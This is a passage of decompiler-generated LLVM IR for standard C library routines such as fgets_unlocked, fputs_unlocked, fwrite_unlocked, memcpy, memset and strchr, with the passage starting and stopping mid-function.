  store i32 %v1_804f523, i32* @global_var_805e0a4.159, align 4
  %v2_804f52c = call i32 @__pthread_return_void(i32 %v2_804f506, i32 1)
  store i32 %v2_804f52c, i32* @eax, align 4
  %v2_804f53f = call i32 @__pthread_return_void(i32 %v2_804f506, i32 134552351)
  %v1_804f54b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059dfc.162 to i32))
  %v0_804f550 = load i32, i32* bitcast (i32** @global_var_8059df8.163 to i32*), align 8
  store i32 %v0_804f550, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8059dfc.162 to i32), i32* @eax, align 4
  %v2_804f55b = call i32 @__pthread_return_void(i32 %v2_804f506, i32 1)
  %v0_804f5e21 = load i32, i32* @esi, align 4
  %v1_804f5e22 = icmp eq i32 %v0_804f5e21, 0
  %v1_804f5e49 = icmp eq i1 %v1_804f5e22, false
  br i1 %v1_804f5e49, label %dec_label_pc_804f565, label %dec_label_pc_804f5ea

dec_label_pc_804f565:                             ; preds = %dec_label_pc_804f4f9, %dec_label_pc_804f5df
  %v0_804f573 = phi i32 [ %v3_804f5df, %dec_label_pc_804f5df ], [ %v0_804f5e21, %dec_label_pc_804f4f9 ]
  %v1_804f565 = inttoptr i32 %v0_804f573 to i8*
  %v2_804f565 = load i8, i8* %v1_804f565, align 1
  %v3_804f565 = and i8 %v2_804f565, 64
  %v4_804f565 = icmp eq i8 %v3_804f565, 0
  br i1 %v4_804f565, label %dec_label_pc_804f5df, label %dec_label_pc_804f56a

dec_label_pc_804f56a:                             ; preds = %dec_label_pc_804f565
  %v0_804f56a = load i32, i32* @global_var_8059e2c.161, align 4
  %v9_804f56a = icmp eq i32 %v0_804f56a, 2
  br i1 %v9_804f56a, label %dec_label_pc_804f592, label %dec_label_pc_804f573

dec_label_pc_804f573:                             ; preds = %dec_label_pc_804f56a
  %v1_804f573 = add i32 %v0_804f573, 56
  store i32 %v1_804f573, i32* @ebx, align 4
  store i32 %v2_804f506, i32* @eax, align 4
  %v2_804f582 = call i32 @__pthread_return_void(i32 %v2_804f506, i32 134552351)
  %v0_804f587 = load i32, i32* @ebx, align 4
  %v1_804f58a = call i32 @__pthread_return_0(i32 %v0_804f587)
  %v0_804f592.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f592

dec_label_pc_804f592:                             ; preds = %dec_label_pc_804f56a, %dec_label_pc_804f573
  %v0_804f5a5 = phi i32 [ %v0_804f573, %dec_label_pc_804f56a ], [ %v0_804f592.pre, %dec_label_pc_804f573 ]
  %v1_804f592 = inttoptr i32 %v0_804f5a5 to i32*
  %v2_804f592 = load i32, i32* %v1_804f592, align 4
  %v1_804f594 = load i32, i32* @ebp, align 4
  %v2_804f594 = or i32 %v1_804f594, %v2_804f592
  %v1_804f596 = and i32 %v2_804f594, 832
  %v2_804f59b = icmp eq i32 %v1_804f596, 320
  %v1_804f5a0 = icmp eq i1 %v2_804f59b, false
  br i1 %v1_804f5a0, label %dec_label_pc_804f5c5, label %dec_label_pc_804f5a2

dec_label_pc_804f5a2:                             ; preds = %dec_label_pc_804f592
  %v1_804f5a6 = call i32 @__stdio_wcommit(i32 %v0_804f5a5)
  %v1_804f5ae = icmp eq i32 %v1_804f5a6, 0
  br i1 %v1_804f5ae, label %dec_label_pc_804f5b7, label %dec_label_pc_804f5b2

dec_label_pc_804f5b2:                             ; preds = %dec_label_pc_804f5a2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804f5c5

dec_label_pc_804f5b7:                             ; preds = %dec_label_pc_804f5a2
  %v0_804f5b7 = load i32, i32* @esi, align 4
  %v1_804f5b7 = add i32 %v0_804f5b7, 8
  %v2_804f5b7 = inttoptr i32 %v1_804f5b7 to i32*
  %v3_804f5b7 = load i32, i32* %v2_804f5b7, align 4
  %v2_804f5ba = add i32 %v0_804f5b7, 28
  %v3_804f5ba = inttoptr i32 %v2_804f5ba to i32*
  store i32 %v3_804f5b7, i32* %v3_804f5ba, align 4
  %v0_804f5bd = load i32, i32* @esi, align 4
  %v1_804f5bd = inttoptr i32 %v0_804f5bd to i32*
  %v2_804f5bd = load i32, i32* %v1_804f5bd, align 4
  %v2_804f5bd.tr = trunc i32 %v2_804f5bd to i16
  %v1_804f5c2 = and i16 %v2_804f5bd.tr, -65
  %v3_804f5c2 = inttoptr i32 %v0_804f5bd to i16*
  store i16 %v1_804f5c2, i16* %v3_804f5c2, align 2
  br label %dec_label_pc_804f5c5

dec_label_pc_804f5c5:                             ; preds = %dec_label_pc_804f592, %dec_label_pc_804f5b2, %dec_label_pc_804f5b7
  %v0_804f5c5 = load i32, i32* @global_var_8059e2c.161, align 4
  %v9_804f5c5 = icmp eq i32 %v0_804f5c5, 2
  br i1 %v9_804f5c5, label %dec_label_pc_804f5df, label %dec_label_pc_804f5ce

dec_label_pc_804f5ce:                             ; preds = %dec_label_pc_804f5c5
  store i32 %v2_804f506, i32* @eax, align 4
  %v2_804f5d7 = call i32 @__pthread_return_void(i32 %v2_804f506, i32 1)
  br label %dec_label_pc_804f5df

dec_label_pc_804f5df:                             ; preds = %dec_label_pc_804f5c5, %dec_label_pc_804f565, %dec_label_pc_804f5ce
  %v0_804f5df = load i32, i32* @esi, align 4
  %v1_804f5df = add i32 %v0_804f5df, 32
  %v2_804f5df = inttoptr i32 %v1_804f5df to i32*
  %v3_804f5df = load i32, i32* %v2_804f5df, align 4
  store i32 %v3_804f5df, i32* @esi, align 4
  %v1_804f5e2 = icmp eq i32 %v3_804f5df, 0
  %v1_804f5e4 = icmp eq i1 %v1_804f5e2, false
  br i1 %v1_804f5e4, label %dec_label_pc_804f565, label %dec_label_pc_804f5ea

dec_label_pc_804f5ea:                             ; preds = %dec_label_pc_804f5df, %dec_label_pc_804f4f9
  %v0_804f5ea = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804f61b

dec_label_pc_804f5f1:                             ; preds = %dec_label_pc_804f4ed
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804f5f3 = load i8, i8* %tmp23, align 1
  %v4_804f5f3 = and i8 %v3_804f5f3, 64
  %v5_804f5f3 = icmp eq i8 %v4_804f5f3, 0
  br i1 %v5_804f5f3, label %dec_label_pc_804f61b, label %dec_label_pc_804f5f8

dec_label_pc_804f5f8:                             ; preds = %dec_label_pc_804f5f1
  store i32 -1, i32* @edi, align 4
  %v1_804f5ff = call i32 @__stdio_wcommit(i32 %v4_804f4e1)
  %v1_804f607 = icmp eq i32 %v1_804f5ff, 0
  %v1_804f609 = icmp eq i1 %v1_804f607, false
  br i1 %v1_804f609, label %dec_label_pc_804f61b, label %dec_label_pc_804f60b

dec_label_pc_804f60b:                             ; preds = %dec_label_pc_804f5f8
  %v2_804f60b = add i32 %v4_804f4e1, 8
  %v3_804f60b = inttoptr i32 %v2_804f60b to i32*
  %v4_804f60b = load i32, i32* %v3_804f60b, align 4
  store i32 0, i32* @edi, align 4
  %v3_804f610 = add i32 %v4_804f4e1, 28
  %v4_804f610 = inttoptr i32 %v3_804f610 to i32*
  store i32 %v4_804f60b, i32* %v4_804f610, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_804f613 = load i32, i32* %tmp24, align 4
  %v3_804f613.tr = trunc i32 %v3_804f613 to i16
  %v1_804f618 = and i16 %v3_804f613.tr, -65
  store i16 %v1_804f618, i16* %arg1, align 2
  br label %dec_label_pc_804f61b

dec_label_pc_804f61b:                             ; preds = %dec_label_pc_804f5f8, %dec_label_pc_804f5f1, %dec_label_pc_804f5ea, %dec_label_pc_804f60b
  %v0_804f61e = load i32, i32* @edi, align 4
  store i32 %v0_804f4dd, i32* @ebx, align 4
  store i32 %v0_804f4dc, i32* @esi, align 4
  store i32 %v0_804f4db, i32* @edi, align 4
  store i32 %v0_804f4d8, i32* @ebp, align 4
  ret i32 %v0_804f61e

; uselistorder directives
  uselistorder i32 %v3_804f5df, { 1, 2, 0 }
  uselistorder i32 %v2_804f506, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_8059df8.163 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805e0a4.159, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8059e14.158 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 4, 3, 1, 0, 5 }
  uselistorder label %dec_label_pc_804f61b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f5df, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f5c5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f592, { 1, 0 }
  uselistorder label %dec_label_pc_804f565, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804f628 = load i32, i32* @ebp, align 4
  %v4_804f633 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f633, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804f633, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804f679.preheader, label %dec_label_pc_804f685

dec_label_pc_804f679.preheader:                   ; preds = %entry
  %v1_804f67919 = add i32 %arg2, -1
  %v8_804f67923 = icmp eq i32 %v1_804f67919, 0
  store i32 %v1_804f67919, i32* @esi, align 4
  %v1_804f67a25 = icmp eq i1 %v8_804f67923, false
  br i1 %v1_804f67a25, label %dec_label_pc_804f643, label %dec_label_pc_804f67c

dec_label_pc_804f643:                             ; preds = %dec_label_pc_804f679.preheader, %dec_label_pc_804f677.dec_label_pc_804f679_crit_edge.dec_label_pc_804f643_crit_edge
  %v0_804f643 = phi i32 [ %v0_804f643.pre, %dec_label_pc_804f677.dec_label_pc_804f679_crit_edge.dec_label_pc_804f643_crit_edge ], [ %arg3, %dec_label_pc_804f679.preheader ]
  %v1_804f643 = add i32 %v0_804f643, 16
  %v2_804f643 = inttoptr i32 %v1_804f643 to i32*
  %v3_804f643 = load i32, i32* %v2_804f643, align 4
  store i32 %v3_804f643, i32* %eax.global-to-local, align 4
  %v2_804f646 = add i32 %v0_804f643, 24
  %v3_804f646 = inttoptr i32 %v2_804f646 to i32*
  %v4_804f646 = load i32, i32* %v3_804f646, align 4
  %v10_804f646 = icmp ult i32 %v3_804f643, %v4_804f646
  %v1_804f649 = icmp eq i1 %v10_804f646, false
  br i1 %v1_804f649, label %dec_label_pc_804f659, label %dec_label_pc_804f64b

dec_label_pc_804f64b:                             ; preds = %dec_label_pc_804f643
  %v1_804f64b = inttoptr i32 %v3_804f643 to i8*
  %v2_804f64b = load i8, i8* %v1_804f64b, align 1
  %v3_804f64b = zext i8 %v2_804f64b to i32
  %v4_804f64b = load i32, i32* @edx, align 4
  %v5_804f64b = and i32 %v4_804f64b, -256
  %v6_804f64b = or i32 %v5_804f64b, %v3_804f64b
  store i32 %v6_804f64b, i32* @edx, align 4
  %v1_804f64d = add i32 %v3_804f643, 1
  store i32 %v1_804f64d, i32* %eax.global-to-local, align 4
  %v2_804f64e = load i32, i32* @ebx, align 4
  %v3_804f64e = inttoptr i32 %v2_804f64e to i8*
  store i8 %v2_804f64b, i8* %v3_804f64e, align 1
  %v0_804f650 = load i32, i32* @ebx, align 4
  %v1_804f650 = add i32 %v0_804f650, 1
  store i32 %v1_804f650, i32* @ebx, align 4
  %v0_804f651 = load i32, i32* @edx, align 4
  %v1_804f651 = trunc i32 %v0_804f651 to i8
  %v10_804f651 = icmp eq i8 %v1_804f651, 10
  %v0_804f654 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f654 = load i32, i32* @ebp, align 4
  %v2_804f654 = add i32 %v1_804f654, 16
  %v3_804f654 = inttoptr i32 %v2_804f654 to i32*
  store i32 %v0_804f654, i32* %v3_804f654, align 4
  br i1 %v10_804f651, label %dec_label_pc_804f67c, label %dec_label_pc_804f677.dec_label_pc_804f679_crit_edge

dec_label_pc_804f659:                             ; preds = %dec_label_pc_804f643
  %v0_804f65d = call i32 @getc_unlocked()
  %v1_804f65d = trunc i32 %v0_804f65d to i8
  store i32 %v0_804f65d, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804f65d, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804f668 = icmp eq i1 %tmp, false
  br i1 %v1_804f668, label %dec_label_pc_804f677, label %dec_label_pc_804f66a

dec_label_pc_804f66a:                             ; preds = %dec_label_pc_804f659
  %v0_804f66a = load i32, i32* @ebp, align 4
  %v1_804f66a = inttoptr i32 %v0_804f66a to i8*
  %v2_804f66a = load i8, i8* %v1_804f66a, align 1
  %v3_804f66a = and i8 %v2_804f66a, 8
  %v4_804f66a = icmp eq i8 %v3_804f66a, 0
  br i1 %v4_804f66a, label %dec_label_pc_804f67c, label %dec_label_pc_804f685

dec_label_pc_804f677:                             ; preds = %dec_label_pc_804f659
  %v3_804f672 = load i32, i32* @ebx, align 4
  %v4_804f672 = inttoptr i32 %v3_804f672 to i8*
  store i8 %v1_804f65d, i8* %v4_804f672, align 1
  %v0_804f674 = load i32, i32* @ebx, align 4
  %v1_804f674 = add i32 %v0_804f674, 1
  store i32 %v1_804f674, i32* @ebx, align 4
  %v11_804f675 = icmp eq i8 %v1_804f65d, 10
  br i1 %v11_804f675, label %dec_label_pc_804f67c, label %dec_label_pc_804f677.dec_label_pc_804f679_crit_edge

dec_label_pc_804f677.dec_label_pc_804f679_crit_edge: ; preds = %dec_label_pc_804f64b, %dec_label_pc_804f677
  %v0_804f679.pre = load i32, i32* @esi, align 4
  %v1_804f679 = add i32 %v0_804f679.pre, -1
  %v8_804f679 = icmp eq i32 %v1_804f679, 0
  store i32 %v1_804f679, i32* @esi, align 4
  %v1_804f67a = icmp eq i1 %v8_804f679, false
  br i1 %v1_804f67a, label %dec_label_pc_804f677.dec_label_pc_804f679_crit_edge.dec_label_pc_804f643_crit_edge, label %dec_label_pc_804f67c

dec_label_pc_804f677.dec_label_pc_804f679_crit_edge.dec_label_pc_804f643_crit_edge: ; preds = %dec_label_pc_804f677.dec_label_pc_804f679_crit_edge
  %v0_804f643.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f643

dec_label_pc_804f67c:                             ; preds = %dec_label_pc_804f679.preheader, %dec_label_pc_804f64b, %dec_label_pc_804f677.dec_label_pc_804f679_crit_edge, %dec_label_pc_804f677, %dec_label_pc_804f66a
  %v0_804f67c = load i32, i32* @ebx, align 4
  %v1_804f67c = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_804f67c, %v1_804f67c
  br i1 %tmp27, label %dec_label_pc_804f680, label %dec_label_pc_804f685

dec_label_pc_804f680:                             ; preds = %dec_label_pc_804f67c
  %v1_804f680 = inttoptr i32 %v0_804f67c to i8*
  store i8 0, i8* %v1_804f680, align 1
  %v0_804f68a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f687

dec_label_pc_804f685:                             ; preds = %dec_label_pc_804f67c, %dec_label_pc_804f66a, %entry
  br label %dec_label_pc_804f687

dec_label_pc_804f687:                             ; preds = %dec_label_pc_804f680, %dec_label_pc_804f685
  %v0_804f68a = phi i32 [ %v0_804f68a.pre, %dec_label_pc_804f680 ], [ 0, %dec_label_pc_804f685 ]
  store i32 %v0_804f68a, i32* %eax.global-to-local, align 4
  store i32 %v0_804f628, i32* @ebp, align 4
  ret i32 %v0_804f68a

; uselistorder directives
  uselistorder i32 %v0_804f68a, { 1, 0 }
  uselistorder i32 %v0_804f67c, { 1, 0 }
  uselistorder i32 %v1_804f679, { 1, 0 }
  uselistorder i32 %v0_804f65d, { 0, 2, 1 }
  uselistorder i32 %v0_804f643, { 1, 0 }
  uselistorder label %dec_label_pc_804f687, { 1, 0 }
  uselistorder label %dec_label_pc_804f67c, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804f677.dec_label_pc_804f679_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804f643, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804f694 = load i32, i32* @esi, align 4
  %v0_804f695 = load i32, i32* @ebx, align 4
  store i32 %v0_804f695, i32* %stack_var_-8, align 4
  %v4_804f699 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f699, i32* @ebx, align 4
  %v3_804f69e = call i32 @strlen(i8* %arg1)
  store i32 %v3_804f69e, i32* @esi, align 4
  %v0_804f6af = load i32, i32* @ebx, align 4
  %v6_804f6b0 = call i32 @__GI_fwrite_unlocked(i32 %v0_804f6af, i64 1, i32 %v3_804f69e, i32 %arg2)
  %v1_804f6ba = load i32, i32* @esi, align 4
  %v12_804f6ba = icmp eq i32 %v6_804f6b0, %v1_804f6ba
  %v3_804f6bc = select i1 %v12_804f6ba, i32 %v6_804f6b0, i32 -1
  %v2_804f6c2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f6c2, i32* @ebx, align 4
  store i32 %v0_804f694, i32* @esi, align 4
  ret i32 %v3_804f6bc

; uselistorder directives
  uselistorder i32 %v6_804f6b0, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804f6c8 = load i32, i32* @edi, align 4
  %v0_804f6c9 = load i32, i32* @esi, align 4
  %v0_804f6ca = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804f6cf = trunc i64 %arg2 to i32
  store i32 %v4_804f6cf, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804f6d7 = inttoptr i32 %arg4 to i16*
  %v2_804f6d7 = load i16, i16* %v1_804f6d7, align 2
  %v1_804f6da = and i16 %v2_804f6d7, 192
  %v6_804f6df = icmp eq i16 %v1_804f6da, 192
  br i1 %v6_804f6df, label %dec_label_pc_804f6fa, label %dec_label_pc_804f6e6

dec_label_pc_804f6e6:                             ; preds = %entry
  %v0_804f6e6 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804f6ee = call i32 @__stdio_trans2w_o(i16* %v1_804f6d7, i32 128, i32 %v0_804f6e6, i32 %v0_804f6e6, i32 %v0_804f6ca, i32 %v0_804f6c9, i32 %v0_804f6c8)
  %v1_804f6f6 = icmp eq i32 %v9_804f6ee, 0
  %v1_804f6f8 = icmp eq i1 %v1_804f6f6, false
  br i1 %v1_804f6f8, label %dec_label_pc_804f73a, label %dec_label_pc_804f6fa

dec_label_pc_804f6fa:                             ; preds = %dec_label_pc_804f6e6, %entry
  %v2_804f6fa = icmp eq i32 %v4_804f6cf, 0
  br i1 %v2_804f6fa, label %dec_label_pc_804f73a, label %dec_label_pc_804f6fe

dec_label_pc_804f6fe:                             ; preds = %dec_label_pc_804f6fa
  %v1_804f6fe = icmp eq i32 %arg3, 0
  br i1 %v1_804f6fe, label %dec_label_pc_804f73a, label %dec_label_pc_804f702

dec_label_pc_804f702:                             ; preds = %dec_label_pc_804f6fe
  %v9_804f707 = udiv i64 4294967295, %arg2
  %v10_804f707 = trunc i64 %v9_804f707 to i32
  %v6_804f70b = icmp ult i32 %v10_804f707, %arg3
  br i1 %v6_804f70b, label %dec_label_pc_804f727, label %dec_label_pc_804f70d

dec_label_pc_804f70d:                             ; preds = %dec_label_pc_804f702
  %sext = mul i64 %arg2, 4294967296
  %v2_804f710 = sdiv i64 %sext, 4294967296
  %v3_804f710 = sext i32 %arg3 to i64
  %v4_804f710 = mul nsw i64 %v3_804f710, %v2_804f710
  %v5_804f710 = trunc i64 %v4_804f710 to i32
  %v0_804f713 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804f719 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804f710, i32 %v0_804f713, i32 %v10_804f707)
  %v6_804f719 = sext i32 %v5_804f719 to i64
  %v10_804f723 = udiv i64 %v6_804f719, %arg2
  %v11_804f723 = trunc i64 %v10_804f723 to i32
  br label %dec_label_pc_804f73c

dec_label_pc_804f727:                             ; preds = %dec_label_pc_804f702
  %v0_804f727 = load i32, i32* @ebx, align 4
  %v1_804f727 = inttoptr i32 %v0_804f727 to i32*
  %v2_804f727 = load i32, i32* %v1_804f727, align 4
  %v1_804f729 = or i32 %v2_804f727, 8
  %v1_804f72c = trunc i32 %v1_804f729 to i16
  %v3_804f72c = inttoptr i32 %v0_804f727 to i16*
  store i16 %v1_804f72c, i16* %v3_804f72c, align 2
  %v0_804f72f = load i32, i32* %stack_var_-28, align 4
  %v1_804f72f = call i32 @__errno_location(i32 %v0_804f72f)
  %v1_804f734 = inttoptr i32 %v1_804f72f to i32*
  store i32 22, i32* %v1_804f734, align 4
  br label %dec_label_pc_804f73a

dec_label_pc_804f73a:                             ; preds = %dec_label_pc_804f6fe, %dec_label_pc_804f6fa, %dec_label_pc_804f6e6, %dec_label_pc_804f727
  br label %dec_label_pc_804f73c

dec_label_pc_804f73c:                             ; preds = %dec_label_pc_804f70d, %dec_label_pc_804f73a
  %v0_804f73f = phi i32 [ %v11_804f723, %dec_label_pc_804f70d ], [ 0, %dec_label_pc_804f73a ]
  store i32 %v0_804f6c9, i32* @esi, align 4
  store i32 %v0_804f6c8, i32* @edi, align 4
  ret i32 %v0_804f73f

; uselistorder directives
  uselistorder i32 %v0_804f6e6, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f73c, { 1, 0 }
  uselistorder label %dec_label_pc_804f73a, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f741 = load i32, i32* @esi, align 4
  store i32 %v0_804f741, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f742 = sdiv i32 %sext, 16777216
  store i32 %v4_804f742, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f74a = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f74a, i32* %edi.global-to-local, align 4
  %v2_804f750 = udiv i32 %v4_804f742, 4
  %v3_804f753 = inttoptr i32 %arg2 to i8*
  %v4_804f753 = bitcast i16* %arg1 to i8*
  %v5_804f753 = call i8* @_memcpy(i8* %v4_804f753, i8* %v3_804f753, i32 %v2_804f750)
  %v6_804f753 = ptrtoint i8* %v5_804f753 to i32
  store i32 %v6_804f753, i32* @ecx, align 4
  %v0_804f755 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f755 = and i32 %v0_804f755, 2
  %v3_804f755 = icmp eq i32 %v2_804f755, 0
  br i1 %v3_804f755, label %dec_label_pc_804f75b, label %dec_label_pc_804f759

dec_label_pc_804f759:                             ; preds = %entry
  %v0_804f759 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f759 = inttoptr i32 %v0_804f759 to i16*
  %v2_804f759 = load i16, i16* %v1_804f759, align 2
  %v3_804f759 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f759 = inttoptr i32 %v3_804f759 to i16*
  store i16 %v2_804f759, i16* %v4_804f759, align 2
  %v5_804f759 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f759 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f759 = load i1, i1* @df, align 1
  %v8_804f759 = select i1 %v7_804f759, i32 -2, i32 2
  %v9_804f759 = add i32 %v8_804f759, %v5_804f759
  %v10_804f759 = add i32 %v8_804f759, %v6_804f759
  store i32 %v9_804f759, i32* %edi.global-to-local, align 4
  store i32 %v10_804f759, i32* %esi.global-to-local, align 4
  %v0_804f75b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f75b

dec_label_pc_804f75b:                             ; preds = %entry, %dec_label_pc_804f759
  %v0_804f75b = phi i32 [ %v0_804f755, %entry ], [ %v0_804f75b.pre, %dec_label_pc_804f759 ]
  %v2_804f75b = urem i32 %v0_804f75b, 2
  %v3_804f75b = icmp eq i32 %v2_804f75b, 0
  br i1 %v3_804f75b, label %dec_label_pc_804f760, label %dec_label_pc_804f75f

dec_label_pc_804f75f:                             ; preds = %dec_label_pc_804f75b
  %v0_804f75f = load i32, i32* %esi.global-to-local, align 4
  %v1_804f75f = inttoptr i32 %v0_804f75f to i8*
  %v2_804f75f = load i8, i8* %v1_804f75f, align 1
  %v3_804f75f = load i32, i32* %edi.global-to-local, align 4
  %v4_804f75f = inttoptr i32 %v3_804f75f to i8*
  store i8 %v2_804f75f, i8* %v4_804f75f, align 1
  %v5_804f75f = load i32, i32* %edi.global-to-local, align 4
  %v6_804f75f = load i32, i32* %esi.global-to-local, align 4
  %v7_804f75f = load i1, i1* @df, align 1
  %v8_804f75f = select i1 %v7_804f75f, i32 -1, i32 1
  %v9_804f75f = add i32 %v8_804f75f, %v5_804f75f
  %v10_804f75f = add i32 %v8_804f75f, %v6_804f75f
  store i32 %v9_804f75f, i32* %edi.global-to-local, align 4
  store i32 %v10_804f75f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f75b, %dec_label_pc_804f75f
  store i32 %v4_804f74a, i32* %eax.global-to-local, align 4
  %v2_804f764 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f764, i32* @esi, align 4
  ret i32 %v4_804f74a

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f760, { 1, 0 }
  uselistorder label %dec_label_pc_804f75b, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804f768 = load i32, i32* @edi, align 4
  %v4_804f771 = ptrtoint i8* %arg1 to i32
  %v5_804f775 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804f775 = ptrtoint i8* %v5_804f775 to i32
  store i32 %v6_804f775, i32* @ecx, align 4
  store i32 %v0_804f768, i32* @edi, align 4
  ret i32 %v4_804f771

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f781 = ptrtoint i8* %arg1 to i32
  %v2_804f789 = mul i32 %arg2, 256
  %v3_804f789 = and i32 %v2_804f789, 65280
  %v4_804f789 = and i32 %arg2, -65281
  %v5_804f789 = or i32 %v3_804f789, %v4_804f789
  %v8_804f78b.pre = load i1, i1* @df, align 1
  %v9_804f78b = select i1 %v8_804f78b.pre, i32 -1, i32 1
  br label %dec_label_pc_804f78b

dec_label_pc_804f78b:                             ; preds = %dec_label_pc_804f790, %entry
  %v4_804f78b = phi i32 [ %v6_804f78b, %dec_label_pc_804f790 ], [ %v5_804f789, %entry ]
  %v7_804f78b = phi i32 [ %v10_804f78b, %dec_label_pc_804f790 ], [ %v4_804f781, %entry ]
  %v1_804f78b = inttoptr i32 %v7_804f78b to i8*
  %v2_804f78b = load i8, i8* %v1_804f78b, align 1
  %v10_804f78b = add i32 %v7_804f78b, %v9_804f78b
  %v3_804f78c = udiv i32 %v4_804f78b, 256
  %v4_804f78c = trunc i32 %v3_804f78c to i8
  %v16_804f78c = icmp eq i8 %v2_804f78b, %v4_804f78c
  br i1 %v16_804f78c, label %dec_label_pc_804f799, label %dec_label_pc_804f790

dec_label_pc_804f790:                             ; preds = %dec_label_pc_804f78b
  %v3_804f78b = zext i8 %v2_804f78b to i32
  %v5_804f78b = and i32 %v4_804f78b, -256
  %v6_804f78b = or i32 %v3_804f78b, %v5_804f78b
  %v4_804f790 = icmp eq i8 %v2_804f78b, 0
  %v1_804f792 = icmp eq i1 %v4_804f790, false
  br i1 %v1_804f792, label %dec_label_pc_804f78b, label %dec_label_pc_804f794

dec_label_pc_804f794:                             ; preds = %dec_label_pc_804f790
  br label %dec_label_pc_804f799

dec_label_pc_804f799:                             ; preds = %dec_label_pc_804f78b, %dec_label_pc_804f794
  %v0_804f799 = phi i32 [ 1, %dec_label_pc_804f794 ], [ %v10_804f78b, %dec_label_pc_804f78b ]
  %v1_804f79b = add i32 %v0_804f799, -1
  ret i32 %v1_804f79b

; uselistorder directives
  uselistorder i8 %v2_804f78b, { 1, 2, 0 }
  uselistorder i32 %v4_804f78b, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f799, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f7a1 = load i32, i32* @esi, align 4
  store i32 %v0_804f7a1, i32* %stack_var_-8, align 4
